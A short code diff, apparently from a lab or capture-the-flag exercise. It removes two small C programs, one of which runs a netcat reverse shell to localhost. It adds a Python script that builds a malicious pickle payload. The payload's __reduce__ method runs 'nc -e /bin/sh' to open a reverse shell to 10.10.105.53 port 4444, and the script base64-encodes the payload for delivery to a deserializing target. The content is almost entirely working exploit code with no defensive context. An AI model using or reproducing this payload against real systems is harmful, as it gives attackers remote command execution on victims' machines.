@@ -1,19 +1,10 @@
-#include <stdio.h>
-#include <stdlib.h>
+import pickle
+import base64
 
-int main() {
-    system("pwd");
-    printf("Ты здесь, а мог быть на Бали\n");
-    return 0;
-}
+class RCE:
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.call, (['/bin/sh', '-c', 'nc -e /bin/sh 10.10.105.53 4444'],))
 
-
-
-
-
-#include <stdlib.h>
-
-int main() {
-    system("nc 127.0.0.1 4444 -e /bin/sh");
-    return 0;
-}
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
